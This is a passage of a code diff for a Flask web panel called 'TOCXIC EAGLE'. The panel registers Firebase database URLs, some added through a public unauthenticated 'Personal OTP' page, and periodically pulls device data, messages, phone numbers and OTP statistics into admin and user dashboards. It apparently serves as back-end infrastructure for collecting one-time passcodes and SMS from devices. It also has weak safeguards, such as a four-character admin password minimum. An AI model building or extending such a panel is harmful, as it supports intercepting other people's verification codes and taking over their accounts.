-    if url and not url.startswith("http"):
-        url = "https://" + url
-    if not url or "firebase" not in url:
-        return jsonify({"success": False, "error": "Invalid URL"}), 400
+    if url and not url.startswith("http"): url = "https://" + url
+    if not url or "firebase" not in url: return jsonify({"success": False, "error": "Invalid URL"}), 400
     if fb_collection.find_one({"url": url}):
         return jsonify({"success": False, "error": "Already added"}), 409
-    name = url.replace("https://", "").split(".")[0][:30]
-    fb_collection.insert_one({
-        "url": url, "name": name,
-        "added_at": int(time.time()), "source": "admin",
-    })
+    name = url.replace("https://","").split(".")[0][:30]
+    fb_collection.insert_one({"url": url, "name": name,
+        "added_at": int(time.time()), "source": "admin"})
     if not IS_SERVERLESS:
         threading.Thread(target=refresh_cache, daemon=True).start()
     return jsonify({"success": True})
-
-
-@app.route("/api/firebases/bulk", methods=["POST"])
-@admin_required
-def api_fb_bulk():
-    init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
-    data = request.get_json() or {}
-    urls = data.get("urls", [])
-    added, skipped = 0, 0
-    for u in urls:
-        url = (u or "").strip().rstrip("/")
-        if url and not url.startswith("http"):
-            url = "https://" + url
-        if not url or "firebase" not in url:
-            continue
-        if fb_collection.find_one({"url": url}):
-            skipped += 1
-            continue
-        name = url.replace("https://", "").split(".")[0][:30]
-        fb_collection.insert_one({
-            "url": url, "name": name,
-            "added_at": int(time.time()), "source": "admin_bulk",
-        })
-        added += 1
-    if not IS_SERVERLESS:
-        threading.Thread(target=refresh_cache, daemon=True).start()
-    return jsonify({"success": True, "added": added, "skipped": skipped})
-
 
 @app.route("/api/firebases/<fb_id>", methods=["DELETE"])
 @admin_required
 def api_fb_delete(fb_id):
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
         res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
         if res.deleted_count == 0:
             return jsonify({"success": False, "error": "Not found"}), 404
         with cache["lock"]:
-            cache["numbers_map"] = {}
-            cache["devices"] = {}
-            cache["device_messages"] = {}
-            cache["msg_cache_time"] = {}
+            cache["numbers_map"] = {}; cache["devices"] = {}
             cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
-            cache["fb_stats"] = {}
         if not IS_SERVERLESS:
             threading.Thread(target=refresh_cache, daemon=True).start()
         return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 400
 
+# ============================================================
+# FIREBASES MANAGEMENT PAGE
+# ============================================================
+FIREBASES_HTML = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Firebases</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+""" + ORBITRON + """
+<style>""" + DARK_CSS + """
+.container{max-width:800px;margin:0 auto;padding:16px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:14px}
+.card h3{font-size:13px;color:var(--text);margin-bottom:14px;font-weight:800;
+  font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
+.add-row{display:flex;gap:8px;flex-wrap:wrap}
+.add-row input{flex:1;min-width:200px;padding:14px 16px;border-radius:12px;
+  border:1px solid var(--border2);background:var(--bg3);font-size:14px;outline:none;color:var(--text)}
+.add-row input:focus{border-color:var(--blue2);box-shadow:0 0 0 4px rgba(59,130,246,.12)}
+.add-row button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;font-size:12px;
+  font-family:inherit;min-height:50px;cursor:pointer;background:var(--grad);color:#fff}
+.fb-list{display:grid;gap:10px}
+.fb-card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:16px;
+  display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.fb-icon{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,#fef3c7,#fde68a);
+  display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.fb-info{flex:1;min-width:0}
+.fb-name{font-size:14px;font-weight:800;color:var(--text);font-family:'Orbitron',sans-serif}
+.fb-hash{font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace;word-break:break-all}
+.fb-actions button{padding:10px 14px;font-size:12px;background:rgba(228,0,0,.1);
+  color:var(--red2);border:none;border-radius:10px;font-weight:800;cursor:pointer}
+.msg{margin-top:12px;padding:12px 16px;border-radius:12px;font-size:13px;display:none;font-weight:700}
+.msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
+.msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
+</style></head><body>
 
-@app.route("/api/firebases/bulk-delete", methods=["POST"])
+<div class="topbar">
+<div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
+<div class="nav-links" style="padding:0;background:none;border:none">
+<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
+<a href="/firebases" class="nav-link active">🔥 Firebases</a>
+<a href="/admin/security" class="nav-link">🔒 Security</a>
+<a href="/logout" class="nav-link">Logout</a>
+</div>
+</div>
+
+<div class="container">
+<div class="card">
+<h3>➕ Add Firebase URL</h3>
+<div class="add-row">
+<input id="fb-url" placeholder="https://xxx.firebaseio.com"
+  onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
+<button onclick="addFirebase()">Add</button>
+</div>
+<div id="fb-msg" class="msg"></div>
+</div>
+
+<div class="card">
+<h3>🔥 Registered Firebases <span id="fb-count" style="color:var(--text3);font-weight:600">(0)</span></h3>
+<div id="fb-list" class="fb-list"></div>
+</div>
+</div>
+
+<div id="toast"></div>
+<script>
+function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
+e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
+function showMsg(t, type){ const e = document.getElementById('fb-msg');
+e.className = 'msg ' + type; e.textContent = t;
+if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
+
+async function addFirebase(){
+  const url = document.getElementById('fb-url').value.trim();
+  if(!url) return showMsg('URL required','err');
+  try {
+    const r = await fetch('/api/firebases', { method:'POST',
+      headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
+    const d = await r.json();
+    if(d.success){ showMsg('✅ Added','ok'); document.getElementById('fb-url').value=''; loadFbs(); }
+    else showMsg('❌ ' + (d.error||'Error'),'err');
+  } catch(e){ showMsg('❌ Network error','err'); }
+}
+
+async function loadFbs(){
+  try {
+    const r = await fetch('/api/firebases'); const d = await r.json();
+    const box = document.getElementById('fb-list');
+    document.getElementById('fb-count').textContent = '(' + (d.firebases?.length || 0) + ')';
+    if(!d.firebases || !d.firebases.length){
+      box.innerHTML = '<div class="empty">🦅 No firebase yet</div>'; return;
+    }
+    box.innerHTML = d.firebases.map(f => `
+      <div class="fb-card">
+        <div class="fb-icon">🔥</div>
+        <div class="fb-info">
+          <div class="fb-name">${escHtml(f.name||'unnamed')}</div>
+          <div class="fb-hash">🔒 ID: ${escHtml(f.hash||'hidden')}</div>
+        </div>
+        <div class="fb-actions">
+          <button onclick="removeFb('${f.id}')">🗑 Delete</button>
+        </div>
+      </div>`).join('');
+  } catch(e){}
+}
+
+async function removeFb(id){
+  if(!confirm('Delete this firebase?')) return;
+  const r = await fetch('/api/firebases/' + id, { method:'DELETE' });
+  const d = await r.json();
+  if(d.success){ toast('✅ Deleted'); loadFbs(); }
+  else toast('❌ ' + (d.error||'Error'));
+}
+
+function escHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
+
+loadFbs();
+</script>
+</body></html>"""
+
+@app.route("/firebases")
 @admin_required
-def api_fb_bulk_delete():
+def firebases_page():
+    return Response(FIREBASES_HTML, mimetype="text/html")
+
+# ============================================================
+# SECURITY PAGE
+# ============================================================
+SECURITY_HTML = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Security</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+""" + ORBITRON + """
+<style>""" + DARK_CSS + """
+.container{max-width:520px;margin:0 auto;padding:20px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:14px}
+.card h3{font-size:14px;color:var(--text);margin-bottom:6px;font-weight:800;
+  font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
+.card p.desc{font-size:12px;color:var(--text3);margin-bottom:16px}
+.field label{display:block;font-size:12px;color:var(--text3);font-weight:700;margin-bottom:6px}
+.pwd-wrap{position:relative}
+.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:12px;
+  border:1.5px solid var(--border2);background:var(--bg3);outline:none;color:var(--text)}
+.pwd-wrap input:focus{border-color:var(--blue2);box-shadow:0 0 0 4px rgba(59,130,246,.12)}
+.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);
+  cursor:pointer;font-size:18px;color:var(--text3);padding:4px}
+.btn{padding:14px 20px;border:none;border-radius:12px;font-weight:800;font-size:13px;
+  width:100%;min-height:50px;font-family:inherit;cursor:pointer;background:var(--grad-r);color:#fff;margin-top:14px}
+.msg{margin-top:12px;padding:12px 14px;border-radius:12px;font-size:13px;
+  display:none;text-align:center;font-weight:700}
+.msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
+.msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
+</style></head><body>
+
+<div class="topbar">
+<div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
+<div class="nav-links" style="padding:0;background:none;border:none">
+<a href="/admin/dashboard" class="nav-link">📱 Numbers</a>
+<a href="/firebases" class="nav-link">🔥 Firebases</a>
+<a href="/admin/security" class="nav-link active">🔒 Security</a>
+<a href="/logout" class="nav-link">Logout</a>
+</div>
+</div>
+
+<div class="container">
+<div class="card">
+<h3>👑 Change Admin Password</h3>
+<p class="desc">New password saves to MongoDB permanently.</p>
+<div class="field">
+<label>New Admin Password</label>
+<div class="pwd-wrap">
+<input type="password" id="admin-pwd" placeholder="Enter new password">
+<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
+</div>
+</div>
+<button class="btn" onclick="changePwd()">Update Password</button>
+<div class="msg" id="admin-msg"></div>
+</div>
+</div>
+
+<div id="toast"></div>
+<script>
+function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
+e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
+function togglePwd(e){ const i = document.getElementById('admin-pwd'); const t = e.target;
+  if(i.type === 'password'){ i.type='text'; t.textContent='🙈'; }
+  else { i.type='password'; t.textContent='👁️'; } }
+function showMsg(t, type){ const e = document.getElementById('admin-msg');
+  e.className = 'msg ' + type; e.textContent = t;
+  if(type==='ok') setTimeout(()=>{ e.className='msg'; }, 3000); }
+async function changePwd(){
+  const pwd = document.getElementById('admin-pwd').value.trim();
+  if(!pwd || pwd.length < 4){ showMsg('❌ Min 4 chars','err'); return; }
+  const r = await fetch('/api/security/change', { method:'POST',
+    headers:{'Content-Type':'application/json'}, body: JSON.stringify({role:'admin', password: pwd}) });
+  const d = await r.json();
+  if(d.success){ showMsg('✅ Saved!','ok'); document.getElementById('admin-pwd').value=''; toast('✅ Changed'); }
+  else showMsg('❌ ' + (d.error||'Error'),'err');
+}
+</script>
+</body></html>"""
+
+@app.route("/admin/security")
+@admin_required
+def admin_security():
+    return Response(SECURITY_HTML, mimetype="text/html")
+
+@app.route("/api/security/change", methods=["POST"])
+@admin_required
+def api_security_change():
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
     data = request.get_json() or {}
-    ids = data.get("ids", [])
-    deleted = 0
-    for i in ids:
-        try:
-            res = fb_collection.delete_one({"_id": ObjectId(i)})
-            deleted += res.deleted_count
-        except Exception:
-            pass
-    with cache["lock"]:
-        cache["numbers_map"] = {}
-        cache["devices"] = {}
-        cache["device_messages"] = {}
-        cache["msg_cache_time"] = {}
-        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
-        cache["fb_stats"] = {}
-    if not IS_SERVERLESS:
-        threading.Thread(target=refresh_cache, daemon=True).start()
-    return jsonify({"success": True, "deleted": deleted})
+    role = data.get("role", "").strip()
+    pwd = data.get("password", "").strip()
+    if role != "admin": return jsonify({"success": False, "error": "Only admin"}), 400
+    if not pwd or len(pwd) < 4: return jsonify({"success": False, "error": "Too short"}), 400
+    ok = set_pwd(role, pwd)
+    return jsonify({"success": True}) if ok else (jsonify({"success": False, "error": "Save failed"}), 500)
 
+# ============================================================
+# PERSONAL OTP (public user adds own firebase)
+# ============================================================
+PERSONAL_OTP_HTML = """<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+""" + ORBITRON + """
+<style>""" + DARK_CSS + """
+.container{max-width:800px;margin:0 auto;padding:16px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:14px}
+.card h3{font-size:13px;color:var(--text);margin-bottom:14px;font-weight:800;
+  font-family:'Orbitron',sans-serif;letter-spacing:1px;text-transform:uppercase}
+.add-row{display:flex;gap:8px;flex-wrap:wrap}
+.add-row input{flex:1;min-width:200px;padding:14px 16px;border-radius:12px;
+  border:1px solid var(--border2);background:var(--bg3);font-size:14px;outline:none;color:var(--text)}
+.add-row input:focus{border-color:#12b76a;box-shadow:0 0 0 4px rgba(18,183,106,.12)}
+.add-row button{padding:14px 22px;border:none;border-radius:12px;font-weight:800;font-size:12px;
+  font-family:inherit;min-height:50px;cursor:pointer;background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
+.msg{margin-top:12px;padding:12px 16px;border-radius:12px;font-size:13px;display:none;font-weight:700}
+.msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
+.msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
+</style></head><body>
 
-@app.route("/api/firebases/all", methods=["DELETE"])
-@admin_required
-def api_fb_delete_all():
+<div class="topbar">
+<div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
+<div class="nav-links" style="padding:0;background:none;border:none">
+<a href="/user" class="nav-link">📱 Numbers</a>
+<a href="/otp" class="nav-link green active">🔐 Personal OTP</a>
+<a href="/" class="nav-link">🏠 Home</a>
+</div>
+</div>
+
+<div class="container">
+<div class="card">
+<h3>🔐 Add Your Own Firebase</h3>
+<div class="add-row">
+<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com"
+  onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
+<button onclick="addFirebase()">Add Firebase</button>
+</div>
+<div id="msg" class="msg"></div>
+</div>
+
+<div class="card">
+<h3>ℹ️ How it works</h3>
+<div style="font-size:13px;color:var(--text2);line-height:1.7">
+1. Apna Firebase RTDB URL daalo<br>
+2. Admin dashboard me register hoga<br>
+3. 10 min me device data fetch hoga<br>
+4. /user panel me numbers dikhengi<br>
+5. Admin broadcasts /mail tab me aayenge
+</div>
+</div>
+</div>
+
+<div id="toast"></div>
+<script>
+function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
+e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
+function showMsg(t, type){ const e = document.getElementById('msg');
+e.className = 'msg ' + type; e.textContent = t;
+if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
+async function addFirebase(){
+  const url = document.getElementById('fb-url').value.trim();
+  if(!url) return showMsg('❌ URL required','err');
+  showMsg('⏳ Adding...','ok');
+  try {
+    const r = await fetch('/api/otp/add', { method:'POST',
+      headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
+    const d = await r.json();
+    if(d.success){
+      showMsg('✅ Added! Admin dashboard me dekh sakte ho','ok');
+      document.getElementById('fb-url').value = '';
+      toast('✅ Firebase added');
+    } else showMsg('❌ ' + (d.error||'Error'),'err');
+  } catch(e){ showMsg('❌ Network error','err'); }
+}
+</script>
+</body></html>"""
+
+@app.route("/otp")
+def personal_otp():
+    return Response(PERSONAL_OTP_HTML, mimetype="text/html")
+
+@app.route("/api/otp/add", methods=["POST"])
+def api_otp_add():
     init_mongo()
-    if not MONGO_OK:
-        return jsonify({"success": False, "error": "MongoDB down"}), 500
+    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
     try:
-        res = fb_collection.delete_many({})
-        with cache["lock"]:
-            cache["numbers_map"] = {}
-            cache["devices"] = {}
-            cache["device_messages"] = {}
-            cache["msg_cache_time"] = {}
-            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
-            cache["fb_stats"] = {}
+        data = request.get_json() or {}
+        url = (data.get("url") or "").strip().rstrip("/")
+        if url and not url.startswith("http"): url = "https://" + url
+        if not url or "firebase" not in url:
+            return jsonify({"success": False, "error": "Invalid URL"}), 400
+        if fb_collection.find_one({"url": url}):
+            return jsonify({"success": True, "hash": fb_hash(url), "already": True})
+        name = url.replace("https://","").split(".")[0][:30]
+        fb_collection.insert_one({"url": url, "name": name,
+            "added_at": int(time.time()), "source": "personal_otp"})
         if not IS_SERVERLESS:
             threading.Thread(target=refresh_cache, daemon=True).start()
-        return jsonify({"success": True, "deleted": res.deleted_count})
+        return jsonify({"success": True, "hash": fb_hash(url)})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-
 # ============================================================
-# START
+# START BG
 # ============================================================
 if not IS_SERVERLESS:
     threading.Thread(target=bg_refresher, daemon=True).start()
     print(f"BG refresher started — interval: {BG_REFRESH_INTERVAL}s (10 min)")
 else:
     print("Serverless mode: BG disabled")
-
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
